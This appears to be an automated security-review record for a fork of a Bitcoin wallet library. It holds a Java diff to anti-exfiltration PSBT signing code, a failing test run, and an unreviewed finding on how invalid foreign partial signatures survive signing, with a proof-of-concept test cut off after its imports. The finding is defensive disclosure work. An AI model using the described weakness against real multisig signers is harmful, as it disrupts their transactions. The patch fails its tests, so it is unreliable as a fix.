                 || !Arrays.equals(record.getSignerPublicKey(), authoritative.getSignerPublicKey())
                 || !Arrays.equals(record.getMessageHash(), authoritative.getMessageHash())) {
             throw fail(SIGNATURE_SLOT_MISMATCH, "Protocol slot differs from authoritative PSBT semantics");
         }
     }
 
     private static ScriptClassification classify(int index, PSBTInput input) {
         ScriptType type = input.getScriptType();
         if(type == ScriptType.P2WPKH || type == ScriptType.P2SH_P2WPKH) {
             Script program = type == ScriptType.P2WPKH ? input.getUtxo().getScript() : input.getRedeemScript();
             if(program == null || !ScriptType.P2WPKH.isScriptType(program)) failInput(index, "inconsistent P2WPKH script");
             List<ECKey> matches = input.getDerivedPublicKeys().keySet().stream()
                     .filter(key -> ScriptType.P2WPKH.getOutputScript(key.getPubKeyHash()).equals(program)).toList();
             if(matches.size() != 1) failInput(index, "P2WPKH requires exactly one matching BIP32 public key");
             return new ScriptClassification(type == ScriptType.P2WPKH ? "p2wpkh" : "p2sh-p2wpkh", Set.copyOf(matches));
         }
         if(type == ScriptType.P2WSH || type == ScriptType.P2SH_P2WSH) {
             Script witnessScript = input.getWitnessScript();
             if(witnessScript == null || !ScriptType.MULTISIG.isScriptType(witnessScript)) failInput(index, "witness script is not standard multisig");
             List<ScriptChunk> chunks = witnessScript.getChunks();
             if(!chunks.getLast().equalsOpCode(ScriptOpCodes.OP_CHECKMULTISIG)) failInput(index, "witness script must end in CHECKMULTISIG");
             ECKey[] keys;
             try {
                 keys = ScriptType.MULTISIG.getPublicKeysFromScript(witnessScript);
                 if(ScriptType.MULTISIG.getThreshold(witnessScript) > keys.length) failInput(index, "multisig threshold exceeds key count");
                 for(int i = 1; i < chunks.size() - 2; i++) {
                     if(chunks.get(i).getOpcode() != 33 || chunks.get(i).getData() == null || chunks.get(i).getData().length != 33) {
                         failInput(index, "multisig keys must use canonical compressed pushes");
                     }
                 }
             } catch(RuntimeException e) {
                 throw new AntiExfilException(SIGNATURE_SLOT_MISMATCH, "Input " + index + ": invalid multisig script", e);
             }
             Set<ECKey> unique = new HashSet<>(Arrays.asList(keys));
             if(unique.size() != keys.length) failInput(index, "multisig public keys must be unique");
             String kind = type == ScriptType.P2WSH ? "p2wsh-multisig" : "p2sh-p2wsh-multisig";
             return new ScriptClassification(kind, Set.copyOf(unique));
         }
         failInput(index, "unsupported or inconsistent script type " + type);
         throw new AssertionError();
     }
 
     private static void validateDerivations(int index, PSBTInput input, Set<ECKey> signingKeys) {
         Set<ECKey> seen = new HashSet<>();
         for(Map.Entry<ECKey, KeyDerivation> entry : input.getDerivedPublicKeys().entrySet()) {
             if(!seen.add(entry.getKey()) || !signingKeys.contains(entry.getKey())
                     || entry.getValue() == null || entry.getValue().getMasterFingerprint() == null
                     || entry.getValue().getMasterFingerprint().length() != 8) {
                 failInput(index, "invalid, duplicate, or script-foreign BIP32 derivation");
             }
         }
     }
 
     private static void failOnTaproot(int index, PSBTInput input) {
         if(input.isTaproot() || input.getTapInternalKey() != null || input.getTapKeyPathSignature() != null
                 || !input.getTapDerivedPublicKeys().isEmpty()) failInput(index, "Taproot data is unsupported");
     }
 
     private static void failInput(int index, String message) {
         throw fail(SIGNATURE_SLOT_MISMATCH, "Input " + index + ": " + message);
     }
 
     private static AntiExfilException fail(AntiExfilException.Code code, String message) {
         return new AntiExfilException(code, message);
     }
 
     private record ScriptClassification(String kind, Set<ECKey> signingKeys) {}
     private record ByteArray(byte[] value) {
         @Override public boolean equals(Object object) { return object instanceof ByteArray other && Arrays.equals(value, other.value); }
         @Override public int hashCode() { return Arrays.hashCode(value); }
     }
 }

diff --git a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
--- a/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
+++ b/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java
@@ -1,450 +1,452 @@
 package com.sparrowwallet.drongo.antiexfil;
 
 import com.sparrowwallet.drongo.protocol.Sha256Hash;
 import com.sparrowwallet.drongo.psbt.PSBT;
 import com.sparrowwallet.drongo.wallet.Keystore;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.EOFException;
 import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.security.SecureRandom;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
 import java.util.LinkedHashSet;
 import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.Set;
 
 import static com.sparrowwallet.drongo.antiexfil.AntiExfilException.Code.*;
 
 public final class AntiExfilCoordinator {
     private static final byte[] MAGIC = {'A', 'E', 'X', 'S'};
     private static final int VERSION = 1;
     private static final int MAX_STATE_BYTES = 32 * 1024 * 1024;
     private static final int MAX_PSBT_BYTES = 16 * 1024 * 1024;
     private static final int MAX_BLOB_BYTES = 16 * 1024 * 1024;
 
     private final Path sessionPath;
     private final Path journalPath;
     private final Keystore keystore;
     private final byte[] walletIdentity;
 
     private AntiExfilCoordinator(Path sessionPath, Path journalPath, Keystore keystore) {
         if(sessionPath == null || journalPath == null || keystore == null) throw fail(STATE_INVALID, "Coordinator paths and keystore are required");
         this.sessionPath = sessionPath;
         this.journalPath = journalPath;
         this.keystore = keystore;
         this.walletIdentity = walletIdentity(keystore);
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network, false, new SecureRandom());
     }
 
     public static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                                Keystore keystore, AntiExfilNetwork network,
                                                boolean acknowledgePostRevealAbortRisk) {
         return create(sessionPath, journalPath, originalPsbt, keystore, network,
                 acknowledgePostRevealAbortRisk, new SecureRandom());
     }
 
     static AntiExfilCoordinator create(Path sessionPath, Path journalPath, byte[] originalPsbt,
                                         Keystore keystore, AntiExfilNetwork network,
                                         boolean acknowledgePostRevealAbortRisk, SecureRandom random) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         if(originalPsbt == null || originalPsbt.length > MAX_PSBT_BYTES || network == null || random == null) {
             throw fail(INVALID_MESSAGE, "Invalid coordinator initialization");
         }
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(originalPsbt, keystore);
         byte[] sessionId = random32(random);
         Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
         for(AntiExfilSigningSlot slot : slots) {
             byte[] rho;
             int attempts = 0;
             do {
                 if(attempts++ >= 1024) throw fail(STATE_INVALID, "CSPRNG repeatedly produced duplicate host randomness");
                 rho = random32(random);
             } while(containsValue(rhos, rho));
             rhos.put(slot.getIdentifier(), rho);
         }
         AntiExfilMessage commit = AntiExfilPsbt.buildHostCommitMessage(originalPsbt, keystore, network, sessionId, rhos);
         State state = new State(Phase.COMMITMENTS_CREATED, coordinator.walletIdentity, originalPsbt,
                 AntiExfilCodec.encode(commit), null, null, null, null, rhos);
         List<AntiExfilAbortJournal.AbortEvent> aborts = new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
         if(!aborts.isEmpty() && !acknowledgePostRevealAbortRisk) {
             throw fail(RETRY_CONFLICT, "Post-reveal abort history requires explicit high-severity acknowledgement before a fresh session");
         }
         AntiExfilDurableFiles.locked(sessionPath, () -> {
             AntiExfilDurableFiles.write(sessionPath, encode(state), true);
             return null;
         });
         return coordinator;
     }
 
     public static AntiExfilCoordinator load(Path sessionPath, Path journalPath, Keystore keystore) {
         AntiExfilCoordinator coordinator = new AntiExfilCoordinator(sessionPath, journalPath, keystore);
         coordinator.readValidatedState();
         new AntiExfilAbortJournal(journalPath, coordinator.walletIdentity).getEvents();
         return coordinator;
     }
 
     public byte[] getHostCommitMessage() {
         return readValidatedState().message1.clone();
     }
 
     public byte[] getFrozenPsbt() {
         return readValidatedState().originalPsbt.clone();
     }
 
     public byte[] getHostRevealMessage() {
         State state = readValidatedState();
         if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Signer openings have not been accepted");
         return state.message3.clone();
     }
 
     public Completion getCompletedResult() {
         State state = readValidatedState();
         if(state.phase != Phase.COMPLETE) throw fail(WRONG_STAGE, "Coordinator session is not complete");
         return completion(state);
     }
 
     public byte[] acceptOpenings(byte[] encodedOpenings) {
         if(encodedOpenings == null) throw fail(INVALID_MESSAGE, "Signer openings are required");
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase == Phase.COMPLETE || state.phase == Phase.OPENINGS_ACCEPTED) {
                 if(!Arrays.equals(encodedOpenings, state.message2)) throw fail(RETRY_CONFLICT, "Retry changed accepted signer openings");
                 return state.message3.clone();
             }
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
             AntiExfilMessage openings = AntiExfilCodec.decode(encodedOpenings);
             if(openings.getStage() != AntiExfilStage.SIGNER_OPENINGS) throw fail(WRONG_STAGE, "Expected signer openings");
             AntiExfilCodec.validateTransition(commit, openings);
             List<AntiExfilSlot> revealSlots = new ArrayList<>(openings.getSlots().size());
             for(AntiExfilSlot slot : openings.getSlots()) {
                 AntiExfilSigningSlot.Identifier identifier = identifier(slot);
                 byte[] rho = state.rhos.get(identifier);
                 if(rho == null) throw fail(SIGNATURE_SLOT_MISMATCH, "Opening has no authoritative host-randomness slot");
                 revealSlots.add(new AntiExfilSlot(slot.getInputIndex(), slot.getSighashType(), slot.getSignerPublicKey(),
                         slot.getMessageHash(), slot.getCommitment(), slot.getOpening(), rho, null));
             }
             AntiExfilMessage reveal = new AntiExfilMessage(openings.getNetwork(), AntiExfilStage.HOST_REVEAL,
                     openings.getSessionId(), openings.getPsbtDigest(), revealSlots);
             AntiExfilCodec.validateTransition(openings, reveal);
             byte[] message3 = AntiExfilCodec.encode(reveal);
             State accepted = new State(Phase.OPENINGS_ACCEPTED, state.walletIdentity, state.originalPsbt,
                     state.message1, encodedOpenings, message3, null, null, state.rhos);
             // This durable write is the security boundary: no rho is returned before it succeeds.
             AntiExfilDurableFiles.write(sessionPath, encode(accepted), false);
             return message3.clone();
         });
     }
 
     public Completion complete(byte[] encodedSignatures) {
         if(encodedSignatures == null) throw fail(INVALID_MESSAGE, "Signer signatures are required");
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase == Phase.COMMITMENTS_CREATED) throw fail(WRONG_STAGE, "Cannot complete before accepting openings");
             if(state.phase == Phase.COMPLETE) {
                 if(!Arrays.equals(encodedSignatures, state.message4)) throw fail(RETRY_CONFLICT, "Completed session received different signatures");
                 return completion(state);
             }
             AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
             AntiExfilMessage signatures = AntiExfilCodec.decode(encodedSignatures);
             if(signatures.getStage() != AntiExfilStage.SIGNER_SIGNATURES) throw fail(WRONG_STAGE, "Expected signer signatures");
             AntiExfilCodec.validateTransition(reveal, signatures);
             byte[] signed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
-                    AntiExfilCodec.decode(state.message1), signatures, state.rhos);
+                    AntiExfilCodec.decode(state.message1), reveal, signatures, state.rhos);
             State complete = new State(Phase.COMPLETE, state.walletIdentity, state.originalPsbt,
                     state.message1, state.message2, state.message3, encodedSignatures, signed, state.rhos);
             AntiExfilDurableFiles.write(sessionPath, encode(complete), false);
             return completion(complete);
         });
     }
 
     private Completion completion(State state) {
         return new Completion(state.signedPsbt, deriveVerifiedSignatures(state), false);
     }
 
     private Set<VerifiedAntiExfilSignature> deriveVerifiedSignatures(State state) {
         if(state.phase != Phase.COMPLETE || state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
+        AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
         List<AntiExfilSigningSlot> semantic = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         byte[] reconstructed = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
-                commit, signatures, state.rhos);
+                commit, reveal, signatures, state.rhos);
         if(!Arrays.equals(reconstructed, state.signedPsbt)) {
             throw fail(STATE_INVALID, "Verified-signature evidence does not reconstruct the stored signed PSBT");
         }
         PSBT original = AntiExfilPsbt.parseCanonicalV0(state.originalPsbt);
         byte[] originalDigest = Sha256Hash.hash(state.originalPsbt);
         Set<VerifiedAntiExfilSignature> verified = new LinkedHashSet<>();
         for(int i = 0; i < semantic.size(); i++) {
             AntiExfilSigningSlot authoritative = semantic.get(i);
             AntiExfilSlot signature = signatures.getSlots().get(i);
             byte[] outpoint = original.getTransaction().getInputs().get(authoritative.getInputIndex())
                     .getOutpoint().bitcoinSerialize();
             verified.add(new VerifiedAntiExfilSignature(commit.getSessionId(), originalDigest,
                     state.walletIdentity, authoritative.getInputIndex(), outpoint,
                     authoritative.getSignerPublicKey(), authoritative.getMessageHash(),
                     authoritative.getSighashType(), signature.getSignature()));
         }
         if(verified.size() != semantic.size()) {
             throw fail(STATE_INVALID, "Verified-signature evidence contains duplicate records");
         }
         return Collections.unmodifiableSet(verified);
     }
 
     public AntiExfilAbortJournal.AbortEvent recordPostRevealAbort(AbortReason reason) {
         return AntiExfilDurableFiles.locked(sessionPath, () -> {
             State state = readValidatedStateUnlocked();
             if(state.phase != Phase.OPENINGS_ACCEPTED) {
                 throw fail(WRONG_STAGE, "Only an incomplete post-reveal session can record a selective-abort event");
             }
             if(reason == null) throw fail(STATE_INVALID, "A post-reveal abort reason is required");
             AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
             return new AntiExfilAbortJournal(journalPath, walletIdentity).append(
                     commit.getSessionId(), commit.getPsbtDigest(), reason.name());
         });
     }
 
     public Status getStatus() {
         State state = readValidatedState();
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         int abortCount = new AntiExfilAbortJournal(journalPath, walletIdentity).getEvents().size();
         return new Status(state.phase, commit.getSessionId(), commit.getPsbtDigest(), abortCount, false);
     }
 
     private State readValidatedState() {
         return AntiExfilDurableFiles.locked(sessionPath, this::readValidatedStateUnlocked);
     }
 
     private State readValidatedStateUnlocked() throws IOException {
         if(!Files.exists(sessionPath)) throw new IOException("Coordinator session does not exist");
         State state = decode(AntiExfilDurableFiles.read(sessionPath, MAX_STATE_BYTES));
         validateState(state);
         return state;
     }
 
     private void validateState(State state) {
         if(!Arrays.equals(walletIdentity, state.walletIdentity)) throw fail(STATE_INVALID, "Coordinator session belongs to another wallet key identity");
         List<AntiExfilSigningSlot> slots = AntiExfilPsbt.enumerateSigningSlots(state.originalPsbt, keystore);
         AntiExfilMessage commit = AntiExfilCodec.decode(state.message1);
         AntiExfilMessage rebuilt = AntiExfilPsbt.buildHostCommitMessage(state.originalPsbt, keystore,
                 commit.getNetwork(), commit.getSessionId(), state.rhos);
         if(!Arrays.equals(state.message1, AntiExfilCodec.encode(rebuilt))) throw fail(STATE_INVALID, "Stored commitment transcript is not authoritative");
         if(state.rhos.size() != slots.size()) throw fail(STATE_INVALID, "Stored host-randomness set changed");
         if(state.phase == Phase.COMMITMENTS_CREATED) {
             if(state.message2 != null || state.message3 != null || state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
         if(state.message2 == null || state.message3 == null) invalidPhase();
         AntiExfilMessage openings = AntiExfilCodec.decode(state.message2);
         AntiExfilMessage reveal = AntiExfilCodec.decode(state.message3);
         AntiExfilCodec.validateTransition(commit, openings);
         AntiExfilCodec.validateTransition(openings, reveal);
         for(AntiExfilSlot slot : reveal.getSlots()) {
             byte[] expected = state.rhos.get(identifier(slot));
             if(expected == null || !Arrays.equals(expected, slot.getHostRandomness())) throw fail(STATE_INVALID, "Stored reveal differs from durable randomness");
         }
         if(state.phase == Phase.OPENINGS_ACCEPTED) {
             if(state.message4 != null || state.signedPsbt != null) invalidPhase();
             return;
         }
         if(state.message4 == null || state.signedPsbt == null) invalidPhase();
         AntiExfilMessage signatures = AntiExfilCodec.decode(state.message4);
         AntiExfilCodec.validateTransition(reveal, signatures);
-        byte[] rebuiltSigned = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore, commit, signatures, state.rhos);
+        byte[] rebuiltSigned = AntiExfilPsbt.reconstructSignedPsbt(state.originalPsbt, keystore,
+                commit, reveal, signatures, state.rhos);
         if(!Arrays.equals(rebuiltSigned, state.signedPsbt)) throw fail(STATE_INVALID, "Stored signed PSBT is not reconstructible from verified signatures");
     }
 
     private static byte[] walletIdentity(Keystore keystore) {
         return getWalletKeyIdentity(keystore);
     }
 
     public static byte[] getWalletKeyIdentity(Keystore keystore) {
         if(keystore.getExtendedPublicKey() == null || keystore.getKeyDerivation() == null) throw fail(STATE_INVALID, "Public account keystore is required");
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try {
             bytes.write(keystore.getExtendedPublicKey().getKey().getPubKey());
             bytes.write(keystore.getExtendedPublicKey().getKey().getChainCode());
             bytes.write(keystore.getKeyDerivation().toString().getBytes(StandardCharsets.US_ASCII));
         } catch(IOException impossible) {
             throw new AssertionError(impossible);
         }
         return Sha256Hash.hash(bytes.toByteArray());
     }
 
     private static byte[] encode(State state) throws IOException {
         ByteArrayOutputStream bytes = new ByteArrayOutputStream();
         try(DataOutputStream output = new DataOutputStream(bytes)) {
             output.write(MAGIC);
             output.writeByte(VERSION);
             output.writeByte(state.phase.ordinal());
             output.write(state.walletIdentity);
             writeBlob(output, state.originalPsbt);
             writeBlob(output, state.message1);
             writeNullableBlob(output, state.message2);
             writeNullableBlob(output, state.message3);
             writeNullableBlob(output, state.message4);
             writeNullableBlob(output, state.signedPsbt);
             output.writeShort(state.rhos.size());
             for(Map.Entry<AntiExfilSigningSlot.Identifier, byte[]> entry : state.rhos.entrySet()) {
                 output.writeInt(entry.getKey().getInputIndex());
                 output.write(entry.getKey().getSignerPublicKey());
                 output.write(entry.getValue());
             }
         }
         return bytes.toByteArray();
     }
 
     private static State decode(byte[] body) throws IOException {
         try(DataInputStream input = new DataInputStream(new ByteArrayInputStream(body))) {
             if(!Arrays.equals(input.readNBytes(4), MAGIC) || input.readUnsignedByte() != VERSION) throw new IOException("Unknown coordinator-state format");
             int phaseCode = input.readUnsignedByte();
             if(phaseCode >= Phase.values().length) throw new IOException("Unknown coordinator phase");
             byte[] identity = input.readNBytes(32);
             byte[] original = readBlob(input, MAX_PSBT_BYTES, false);
             byte[] message1 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, false);
             byte[] message2 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message3 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] message4 = readBlob(input, AntiExfilCodec.MAX_MESSAGE_BYTES, true);
             byte[] signed = readBlob(input, MAX_BLOB_BYTES, true);
             int count = input.readUnsignedShort();
             if(identity.length != 32 || count < 1 || count > AntiExfilCodec.MAX_SLOTS) throw new IOException("Invalid coordinator-state header");
             Map<AntiExfilSigningSlot.Identifier, byte[]> rhos = new LinkedHashMap<>();
             for(int i = 0; i < count; i++) {
                 int index = input.readInt();
                 byte[] key = input.readNBytes(33);
                 byte[] rho = input.readNBytes(32);
                 if(key.length != 33 || rho.length != 32 || rhos.put(new AntiExfilSigningSlot.Identifier(index, key), rho) != null) {
                     throw new IOException("Invalid or duplicate coordinator randomness record");
                 }
             }
             if(input.available() != 0) throw new IOException("Trailing coordinator-state data");
             return new State(Phase.values()[phaseCode], identity, original, message1, message2, message3, message4, signed, rhos);
         } catch(EOFException e) {
             throw new IOException("Truncated coordinator state", e);
         }
     }
 
     private static void writeBlob(DataOutputStream output, byte[] value) throws IOException {
         output.writeInt(value.length);
         output.write(value);
     }
 
     private static void writeNullableBlob(DataOutputStream output, byte[] value) throws IOException {
         if(value == null) output.writeInt(-1); else writeBlob(output, value);
     }
 
     private static byte[] readBlob(DataInputStream input, int maximum, boolean nullable) throws IOException {
         int length = input.readInt();
         if(nullable && length == -1) return null;
         if(length < 1 || length > maximum) throw new IOException("Stored blob length is outside limits");
         byte[] value = input.readNBytes(length);
         if(value.length != length) throw new IOException("Truncated stored blob");
         return value;
     }
 
     private static byte[] random32(SecureRandom random) {
         byte[] value = new byte[32];
         random.nextBytes(value);
         return value;
     }
 
     private static boolean containsValue(Map<AntiExfilSigningSlot.Identifier, byte[]> values, byte[] candidate) {
         return values.values().stream().anyMatch(value -> Arrays.equals(value, candidate));
     }
 
     private static AntiExfilSigningSlot.Identifier identifier(AntiExfilSlot slot) {
         if(slot.getInputIndex() > Integer.MAX_VALUE) throw fail(SIGNATURE_SLOT_MISMATCH, "Input index is outside Java PSBT limits");
         return new AntiExfilSigningSlot.Identifier((int)slot.getInputIndex(), slot.getSignerPublicKey());
     }
 
     private static void invalidPhase() {
         throw fail(STATE_INVALID, "Coordinator phase and stored transcripts disagree");
     }
 
     private static AntiExfilException fail(AntiExfilException.Code code, String message) {
         return new AntiExfilException(code, message);
     }
 
     public enum Phase {
         COMMITMENTS_CREATED,
         OPENINGS_ACCEPTED,
         COMPLETE
     }
 
     public enum AbortReason {
         TRANSPORT_FAILED,
         SIGNER_CANCELLED,
         SIGNATURE_REJECTED,
         USER_ABANDONED
     }
 
     public static final class Completion {
         private final byte[] signedPsbt;
         private final Set<VerifiedAntiExfilSignature> verifiedSignatures;
         private final boolean broadcast;
 
         private Completion(byte[] signedPsbt, Set<VerifiedAntiExfilSignature> verifiedSignatures, boolean broadcast) {
             this.signedPsbt = signedPsbt.clone();
             this.verifiedSignatures = Set.copyOf(verifiedSignatures);
             this.broadcast = broadcast;
         }
 
         public byte[] getSignedPsbt() { return signedPsbt.clone(); }
         public Set<VerifiedAntiExfilSignature> getVerifiedSignatures() { return verifiedSignatures; }
         public boolean isBroadcast() { return broadcast; }
     }
 
     public static final class Status {
         private final Phase phase;
         private final byte[] sessionId;
         private final byte[] psbtDigest;
         private final int postRevealAbortCount;
         private final boolean broadcast;
 
         private Status(Phase phase, byte[] sessionId, byte[] psbtDigest, int postRevealAbortCount, boolean broadcast) {
             this.phase = phase;
             this.sessionId = sessionId.clone();
             this.psbtDigest = psbtDigest.clone();
             this.postRevealAbortCount = postRevealAbortCount;
             this.broadcast = broadcast;
         }
 
         public Phase getPhase() { return phase; }
         public byte[] getSessionId() { return sessionId.clone(); }
         public byte[] getPsbtDigest() { return psbtDigest.clone(); }
         public int getPostRevealAbortCount() { return postRevealAbortCount; }
         public boolean isBroadcast() { return broadcast; }
     }
 
     private record State(Phase phase, byte[] walletIdentity, byte[] originalPsbt, byte[] message1,
                          byte[] message2, byte[] message3, byte[] message4, byte[] signedPsbt,
                          Map<AntiExfilSigningSlot.Identifier, byte[]> rhos) {
         private State {
             walletIdentity = walletIdentity.clone();
             originalPsbt = originalPsbt.clone();
             message1 = message1.clone();
             message2 = copy(message2);
             message3 = copy(message3);
             message4 = copy(message4);
             signedPsbt = copy(signedPsbt);
             Map<AntiExfilSigningSlot.Identifier, byte[]> copied = new LinkedHashMap<>();
             rhos.forEach((identifier, rho) -> copied.put(identifier, rho.clone()));
             rhos = Map.copyOf(copied);
         }
 
         private static byte[] copy(byte[] value) { return value == null ? null : value.clone(); }
     }
 }
```
### Affected files
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java`
- `src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilCoordinator.java`
### Validation output

```
[output truncated: 27 lines & 0.8193359375 KB skipped]
FAILURE: Build failed with an exception.

* What went wrong:
Execution failed for task ':test'.
> There were failing tests. See the report at: file:///repo/build/reports/tests/test/index.html

* Try:
> Run with --scan to generate a Build Scan (Powered by Develocity).

BUILD FAILED in 2s
```

---

# Invalid foreign signatures survive completion
**#247996**
- Severity: Medium
- Validity: Unreviewed
## Source locations
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/antiexfil/AntiExfilPsbt.java` (3 locations)
#### Lines 33-53 — _PSBT parsing explicitly disables signature verification._

```
    public static PSBT parseCanonicalV0(byte[] raw) {
        if(raw == null || raw.length < 5 || raw[0] != 'p' || raw[1] != 's' || raw[2] != 'b' || raw[3] != 't' || raw[4] != (byte)0xff) {
            throw fail(INVALID_MESSAGE, "Invalid PSBT magic");
        }
        try {
            PSBT psbt = new PSBT(raw, false);
            if(psbt.getVersion() != null && psbt.getVersion() != 0) {
                throw fail(INVALID_MESSAGE, "Protocol v1 accepts PSBT v0 only");
            }
            if(!Arrays.equals(raw, psbt.serialize())) {
                throw fail(INVALID_MESSAGE, "PSBT is not canonically encoded");
            }
            if(psbt.getTransaction() == null || psbt.getPsbtInputs().isEmpty() || psbt.getPsbtOutputs().isEmpty()) {
                throw fail(INVALID_MESSAGE, "PSBT requires an unsigned transaction");
            }
            return psbt;
        } catch(PSBTParseException | RuntimeException e) {
            if(e instanceof AntiExfilException antiExfilException) throw antiExfilException;
            throw new AntiExfilException(INVALID_MESSAGE, "Invalid PSBT: " + e.getMessage(), e);
        }
    }
```
⋯
#### Lines 84-86 — _Existing-signature rejection covers only the currently controlled key._

```
                if(input.getPartialSignatures().containsKey(publicKey)) {
                    throw fail(UNEXPECTED_RETURN_DATA, "Input " + index + " already has a controlled signature");
                }
```
⋯
#### Lines 154-177 — _Reconstruction preserves the original signature map and merges new signatures._

```
        PSBT reconstructed = parseCanonicalV0(original);
        for(int i = 0; i < semantic.size(); i++) {
            AntiExfilSigningSlot authoritative = semantic.get(i);
            AntiExfilSlot before = commit.getSlots().get(i);
            AntiExfilSlot after = signatures.getSlots().get(i);
            byte[] rho = hostRandomness == null ? null : hostRandomness.get(authoritative.getIdentifier());
            requireSlot(authoritative, before);
            requireSlot(authoritative, after);
            if(!Arrays.equals(before.getCommitment(), after.getCommitment()) || rho == null
                    || !Arrays.equals(AntiExfilCrypto.hostCommit(rho), before.getCommitment())) {
                throw fail(COMMITMENT_MISMATCH, "Stored randomness or response commitment changed");
            }
            if(!AntiExfilCrypto.verify(after.getSignerPublicKey(), after.getMessageHash(), rho,
                    after.getOpening(), after.getSignature())) {
                throw fail(SIGNATURE_INVALID, "Anti-exfil signature verification failed");
            }
            byte[] compact = after.getSignature();
            BigInteger r = new BigInteger(1, Arrays.copyOfRange(compact, 0, 32));
            BigInteger s = new BigInteger(1, Arrays.copyOfRange(compact, 32, 64));
            TransactionSignature signature = new TransactionSignature(new ECDSASignature(r, s), SigHash.ALL);
            reconstructed.getPsbtInputs().get(authoritative.getInputIndex()).getPartialSignatures()
                    .put(ECKey.fromPublicOnly(authoritative.getSignerPublicKey()), signature);
        }
        return reconstructed.serialize();
```
### `FractalEncrypt/drongo@1bbafd9/src/main/java/com/sparrowwallet/drongo/psbt/PSBT.java`
#### Lines 662-672 — _The skipped built-in verifier rejects unverifiable partial signatures._

```
    private void verifySignatures(List<PSBTInput> psbtInputs) throws PSBTSignatureException {
        for(PSBTInput input : psbtInputs) {
            boolean verified = input.verifySignatures();
            if(!verified && !input.getPartialSignatures().isEmpty()) {
                throw new PSBTSignatureException("Unverifiable partial signatures provided");
            }
            if(!verified && input.isTaproot() && input.getTapKeyPathSignature() != null) {
                throw new PSBTSignatureException("Unverifiable taproot keypath signature provided");
            }
        }
    }
```
## Description

The sole PSBT ingestion helper constructs `PSBT` with signature verification disabled. Slot enumeration rejects pre-existing signatures only for wallet-controlled keys, so syntactically valid but cryptographically invalid foreign partial signatures are never examined. Reconstruction reparses the same original and merges newly verified controlled signatures into the existing partial-signature maps instead of replacing them. The intentionally preserved foreign entries therefore survive into the returned signed PSBT even when they do not verify against their declared public keys. The library's existing `PSBT.verifySignatures` path would reject those entries but is explicitly bypassed here.
## Root cause

The anti-exfil PSBT parser disables built-in partial-signature verification without adding a compensating check for signatures outside the locally controlled slot set.
## Impact

An untrusted PSBT supplier or cosigner can make the anti-exfil ceremony complete successfully while returning a PSBT containing invalid foreign signatures. Depending on threshold and finalization behavior, this can force abandonment or failed finalization/broadcast and wastes a completed durable signing session; no direct key or fund theft follows.
## Proof of concept
### Test case

```
package com.sparrowwallet.drongo.antiexfil;

import com.sparrowwallet.drongo.KeyDerivation;
import com.sparrowwallet.drongo.Utils;
import com.sparrowwallet.drongo.crypto.ECKey;
import com.sparrowwallet.drongo.policy.PolicyType;
import com.sparrowwallet.drongo.protocol.SigHash;
import com.sparrowwallet.drongo.protocol.TransactionSignature;
import com.sparrowwallet.drongo.psbt.PSBT;
import com.sparrowwallet.drongo.psbt.PSBTInput;
import com.sparrowwallet.drongo.psbt.PSBTSignatureException;
import com.sparrowwallet.drongo.wallet.DeterministicSeed;
import com.sparrowwallet.drongo.wallet.Keystore;
import org.bouncycastle.math.ec.ECPoint;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertArrayEquals;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
